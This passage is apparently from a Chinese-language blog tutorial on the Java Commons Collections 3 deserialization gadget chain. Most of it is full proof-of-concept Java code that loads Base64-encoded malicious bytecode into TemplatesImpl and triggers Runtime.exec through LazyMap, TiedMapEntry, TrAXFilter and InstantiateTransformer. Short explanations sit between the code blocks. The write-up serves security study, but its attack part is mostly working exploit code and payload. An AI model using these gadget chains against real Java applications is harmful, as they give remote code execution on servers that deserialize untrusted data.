class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.HashSet;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CC3</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">byte</span>[] bytes = Base64.getDecoder().decode(<span class="string">&quot;yv66vgAAADQALAoABgAeCgAfACAIACEKAB8AIgcAIwcAJAEABjxpbml0PgEAAygpVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBABJMb2NhbFZhcmlhYmxlVGFibGUBAAR0aGlzAQAGTGV2aWw7AQAKRXhjZXB0aW9ucwcAJQEACXRyYW5zZm9ybQEAcihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEACGRvY3VtZW50AQAtTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007AQAIaGFuZGxlcnMBAEJbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjsHACYBAKYoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvZHRtL0RUTUF4aXNJdGVyYXRvcjtMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWAQAIaXRlcmF0b3IBADVMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9kdG0vRFRNQXhpc0l0ZXJhdG9yOwEAB2hhbmRsZXIBAEFMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOwEAClNvdXJjZUZpbGUBAAlldmlsLmphdmEMAAcACAcAJwwAKAApAQAIY2FsYy5leGUMACoAKwEABGV2aWwBAEBjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvcnVudGltZS9BYnN0cmFjdFRyYW5zbGV0AQATamF2YS9pby9JT0V4Y2VwdGlvbgEAOWNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9UcmFuc2xldEV4Y2VwdGlvbgEAEWphdmEvbGFuZy9SdW50aW1lAQAKZ2V0UnVudGltZQEAFSgpTGphdmEvbGFuZy9SdW50aW1lOwEABGV4ZWMBACcoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvUHJvY2VzczsAIQAFAAYAAAAAAAMAAQAHAAgAAgAJAAAAQAACAAEAAAAOKrcAAbgAAhIDtgAEV7EAAAACAAoAAAAOAAMAAAAKAAQACwANAAwACwAAAAwAAQAAAA4ADAANAAAADgAAAAQAAQAPAAEAEAARAAIACQAAAD8AAAADAAAAAbEAAAACAAoAAAAGAAEAAAAQAAsAAAAgAAMAAAABAAwADQAAAAAAAQASABMAAQAAAAEAFAAVAAIADgAAAAQAAQAWAAEAEAAXAAIACQAAAEkAAAAEAAAAAbEAAAACAAoAAAAGAAEAAAATAAsAAAAqAAQAAAABAAwADQAAAAAAAQASABMAAQAAAAEAGAAZAAIAAAABABoAGwADAA4AAAAEAAEAFgABABwAAAACAB0=&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">Impl</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        setValue(Impl,<span class="string">&quot;_name&quot;</span>,<span class="string">&quot;b1uel0n3&quot;</span>);</span><br><span class="line">        setValue(Impl,<span class="string">&quot;_class&quot;</span>,<span class="literal">null</span>);</span><br><span class="line">        setValue(Impl,<span class="string">&quot;_bytecodes&quot;</span>,<span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;bytes&#125;);</span><br><span class="line">        setValue(Impl,<span class="string">&quot;_tfactory&quot;</span>,<span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line"></span><br><span class="line">        Transformer[] faketransformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;<span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="number">1</span>)&#125;;</span><br><span class="line">        </span><br><span class="line">        ConstantTransformer Im=<span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Impl);</span><br><span class="line">        InvokerTransformer newTransformer=<span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;newTransformer&quot;</span>,<span class="literal">null</span>,<span class="literal">null</span>);</span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;Im,newTransformer&#125;;</span><br><span class="line">        ChainedTransformer chaind=<span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(faketransformers);</span><br><span class="line"></span><br><span class="line">        Map innermap=<span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        Map Lazymap=LazyMap.decorate(innermap, chaind);</span><br><span class="line">        TiedMapEntry tiedMapEntry=<span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(Lazymap,<span class="string">&quot;b1uel0n3&quot;</span>);</span><br><span class="line">        HashSet map=<span class="keyword">new</span> <span class="title class_">HashSet</span>();</span><br><span class="line">        map.add(tiedMapEntry);</span><br><span class="line">        innermap.remove(<span class="string">&quot;b1uel0n3&quot;</span>);</span><br><span class="line"></span><br><span class="line">        Field field=chaind.getClass().getDeclaredField(<span class="string">&quot;iTransformers&quot;</span>);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(chaind,transformers);</span><br><span class="line"></span><br><span class="line">        serialize(map);</span><br><span class="line">        unserialize();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object o)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        FileOutputStream out=<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;E:\\study\\web\\java\\test.ser&quot;</span>);</span><br><span class="line">        ObjectOutputStream oos=<span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(out);</span><br><span class="line">        oos.writeObject(o);</span><br><span class="line">        oos.close();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">unserialize</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        FileInputStream in=<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;E:\\study\\web\\java\\test.ser&quot;</span>);</span><br><span class="line">        ObjectInputStream ois=<span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(in);</span><br><span class="line">        ois.readObject();</span><br><span class="line">        in.close();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setValue</span><span class="params">(Object obj, String filedname, Object value)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">           Field field=obj.getClass().getDeclaredField(filedname);</span><br><span class="line">           field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">           field.set(obj,value);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/archives/36318858/image-20250630220931822-175245726416317.png" alt="image-20250630220931822"></p><h3 id="TrAXFilter类构造"><a href="#TrAXFilter类构造" class="headerlink" title="TrAXFilter类构造"></a>TrAXFilter类构造</h3><p>观察<a href="https://github.com/frohoff/ysoserial/blob/master/src/main/java/ysoserial/payloads/CommonsCollections3.java">ysoserial</a>给的CC3 poc：</p><p><img src="/archives/36318858/image-20250702192259226-175245726416318.png" alt="image-20250702192259226"></p><p>可以看到它给的poc用的是TrAXFilter类，且ChainedTransformer利用链中并不是利用InvokerTransformer调用newTransformer方法，而是通过InstantiateTransformer类。</p><p>这里我们一一分析，先看TrAXFilter类：<br>先通过全局搜索哪些方法调用了**newTransformer()**方法：</p><p><img src="/archives/36318858/image-20250703192547826-175245726416319.png" alt="image-20250703192547826"></p><p>可以看到，TrAXFilter类恰好调用了templates.newTransformer()方法，且该方法是在构造方法中，注意传入的参数是Templates对象，所以我们可以修改poc传入templates为我们的恶意TemplatesImpl：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CC3</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">byte</span>[] bytes = Base64.getDecoder().decode(<span class="string">&quot;yv66vgAAADQALAoABgAeCgAfACAIACEKAB8AIgcAIwcAJAEABjxpbml0PgEAAygpVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBABJMb2NhbFZhcmlhYmxlVGFibGUBAAR0aGlzAQAGTGV2aWw7AQAKRXhjZXB0aW9ucwcAJQEACXRyYW5zZm9ybQEAcihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEACGRvY3VtZW50AQAtTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007AQAIaGFuZGxlcnMBAEJbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjsHACYBAKYoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvZHRtL0RUTUF4aXNJdGVyYXRvcjtMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWAQAIaXRlcmF0b3IBADVMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9kdG0vRFRNQXhpc0l0ZXJhdG9yOwEAB2hhbmRsZXIBAEFMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOwEAClNvdXJjZUZpbGUBAAlldmlsLmphdmEMAAcACAcAJwwAKAApAQAIY2FsYy5leGUMACoAKwEABGV2aWwBAEBjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvcnVudGltZS9BYnN0cmFjdFRyYW5zbGV0AQATamF2YS9pby9JT0V4Y2VwdGlvbgEAOWNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9UcmFuc2xldEV4Y2VwdGlvbgEAEWphdmEvbGFuZy9SdW50aW1lAQAKZ2V0UnVudGltZQEAFSgpTGphdmEvbGFuZy9SdW50aW1lOwEABGV4ZWMBACcoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvUHJvY2VzczsAIQAFAAYAAAAAAAMAAQAHAAgAAgAJAAAAQAACAAEAAAAOKrcAAbgAAhIDtgAEV7EAAAACAAoAAAAOAAMAAAAKAAQACwANAAwACwAAAAwAAQAAAA4ADAANAAAADgAAAAQAAQAPAAEAEAARAAIACQAAAD8AAAADAAAAAbEAAAACAAoAAAAGAAEAAAAQAAsAAAAgAAMAAAABAAwADQAAAAAAAQASABMAAQAAAAEAFAAVAAIADgAAAAQAAQAWAAEAEAAXAAIACQAAAEkAAAAEAAAAAbEAAAACAAoAAAAGAAEAAAATAAsAAAAqAAQAAAABAAwADQAAAAAAAQASABMAAQAAAAEAGAAZAAIAAAABABoAGwADAA4AAAAEAAEAFgABABwAAAACAB0=&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">Impl</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        setValue(Impl,<span class="string">&quot;_name&quot;</span>,<span class="string">&quot;b1uel0n3&quot;</span>);</span><br><span class="line">        setValue(Impl,<span class="string">&quot;_class&quot;</span>,<span class="literal">null</span>);</span><br><span class="line">        setValue(Impl,<span class="string">&quot;_bytecodes&quot;</span>,<span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;bytes&#125;);</span><br><span class="line">        setValue(Impl,<span class="string">&quot;_tfactory&quot;</span>,<span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line"></span><br><span class="line">        TrAXFilter trAXFilter=<span class="keyword">new</span> <span class="title class_">TrAXFilter</span>(Impl);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setValue</span><span class="params">(Object obj, String filedname, Object value)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        Field field=obj.getClass().getDeclaredField(filedname);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(obj,value);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/archives/36318858/image-20250702224201257-175245726416320.png" alt="image-20250702224201257"></p><p>可以看到能成功弹计算机，但我们肯定是需要在反序列化时能够调用该构造方法弹出计算机呀，即需要在调用链ChainedTransformer中调用，而要执行TrAXFilter的构造方法，这时InvokerTransformer就利用不了了，就需要一个新类<strong>InstantiateTransformer</strong>：</p><p><img src="/archives/36318858/image-20250702233945590-175245726416421.png" alt="image-20250702233945590"></p><p>其实这个类我在CC1链中也提过，该类同样重写了transform方法，在重写的transform方法中，它会先判断传入的input是否是Class类型的实例，然后获取其构造函数，最后利用获取到的构造函数创建实例。</p><p><img src="/archives/36318858/image-20250702235007282-175245726416422.png" alt="image-20250702235007282"></p><p>iParamTypes和iArgs是我们可控的，所以我们可通过<code>Constructor con = ((Class) input).getConstructor(iParamTypes);</code>执行TrAXFilter类的构造方法，iParamTypes为构造函数传入的参数，而根据前面看到的构造方法参数类型为Templates类型的对象，获取了构造构造方法后再创建实例将我们恶意TemplatesImpl类带入执行TemplatesImpl.newTransformer()：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InstantiateTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.Templates;</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.HashSet;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CC3</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">byte</span>[] bytes = Base64.getDecoder().decode(<span class="string">&quot;yv66vgAAADQALAoABgAeCgAfACAIACEKAB8AIgcAIwcAJAEABjxpbml0PgEAAygpVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBABJMb2NhbFZhcmlhYmxlVGFibGUBAAR0aGlzAQAGTGV2aWw7AQAKRXhjZXB0aW9ucwcAJQEACXRyYW5zZm9ybQEAcihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEACGRvY3VtZW50AQAtTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007AQAIaGFuZGxlcnMBAEJbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjsHACYBAKYoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvZHRtL0RUTUF4aXNJdGVyYXRvcjtMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWAQAIaXRlcmF0b3IBADVMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9kdG0vRFRNQXhpc0l0ZXJhdG9yOwEAB2hhbmRsZXIBAEFMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOwEAClNvdXJjZUZpbGUBAAlldmlsLmphdmEMAAcACAcAJwwAKAApAQAIY2FsYy5leGUMACoAKwEABGV2aWwBAEBjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvcnVudGltZS9BYnN0cmFjdFRyYW5zbGV0AQATamF2YS9pby9JT0V4Y2VwdGlvbgEAOWNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9UcmFuc2xldEV4Y2VwdGlvbgEAEWphdmEvbGFuZy9SdW50aW1lAQAKZ2V0UnVudGltZQEAFSgpTGphdmEvbGFuZy9SdW50aW1lOwEABGV4ZWMBACcoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvUHJvY2VzczsAIQAFAAYAAAAAAAMAAQAHAAgAAgAJAAAAQAACAAEAAAAOKrcAAbgAAhIDtgAEV7EAAAACAAoAAAAOAAMAAAAKAAQACwANAAwACwAAAAwAAQAAAA4ADAANAAAADgAAAAQAAQAPAAEAEAARAAIACQAAAD8AAAADAAAAAbEAAAACAAoAAAAGAAEAAAAQAAsAAAAgAAMAAAABAAwADQAAAAAAAQASABMAAQAAAAEAFAAVAAIADgAAAAQAAQAWAAEAEAAXAAIACQAAAEkAAAAEAAAAAbEAAAACAAoAAAAGAAEAAAATAAsAAAAqAAQAAAABAAwADQAAAAAAAQASABMAAQAAAAEAGAAZAAIAAAABABoAGwADAA4AAAAEAAEAFgABABwAAAACAB0=&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">Impl</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        setValue(Impl, <span class="string">&quot;_name&quot;</span>, <span class="string">&quot;b1uel0n3&quot;</span>);</span><br><span class="line">        setValue(Impl, <span class="string">&quot;_class&quot;</span>, <span class="literal">null</span>);</span><br><span class="line">        setValue(Impl, <span class="string">&quot;_bytecodes&quot;</span>, <span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;bytes&#125;);</span><br><span class="line">        setValue(Impl, <span class="string">&quot;_tfactory&quot;</span>, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line"></span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">con</span> <span class="operator">=</span> TrAXFilter.class.getConstructor(Templates.class);</span><br><span class="line">        con.newInstance(Impl);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setValue</span><span class="params">(Object obj, String filedname, Object value)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        Field field=obj.getClass().getDeclaredField(filedname);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(obj,value);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/archives/36318858/image-20250703193638688-175245726416423.png" alt="image-20250703193638688"></p><p>能弹计算机，所以我们就根据这段代码改成ChainedTransformer调用链，即：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ConstantTransformer trAX=<span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(TrAXFilter.class);</span><br><span class="line">InstantiateTransformer in=<span class="keyword">new</span> <span class="title class_">InstantiateTransformer</span>(<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Templates.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;Impl&#125;);</span><br><span class="line">Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;trAX,in&#125;;</span><br><span class="line">ChainedTransformer chaind=<span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br></pre></td></tr></table></figure><p><img src="/archives/36318858/image-20250703194622893-175245726416424.png" alt="image-20250703194622893"></p><p>能运行成功，所以修改最终poc，加上之前的链子前半部分：</p><p>CC6环境下：</p><p>CC3（HashSet）：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InstantiateTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> 